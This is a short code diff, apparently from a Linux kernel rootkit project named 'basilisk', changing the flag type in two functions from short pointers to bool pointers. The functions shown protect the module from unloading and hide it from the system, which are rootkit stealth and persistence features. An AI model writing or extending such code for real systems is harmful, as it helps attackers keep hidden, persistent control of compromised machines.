@@ -241,7 +241,7 @@ Failure can happen, for example, when the module is in the process of being unlo
 
 A reference to a module can be released with module_put().
 */
-void handle_lkm_protect(short *p_flag) {
+void handle_lkm_protect(bool *p_flag) {
     if (!(*p_flag)) {
         pr_info("basilisk: protecting kernel module\n");
         try_module_get(lkm.this_mod);
@@ -255,7 +255,7 @@ void handle_lkm_protect(short *p_flag) {
 /*
 Helper function to handle hiding/showing our LKM 
 */
-void handle_lkm_hide(short *h_flag)
+void handle_lkm_hide(bool *h_flag)
 {
     if(!(*h_flag)) {
         pr_info("basilisk: hiding kernel module\n");
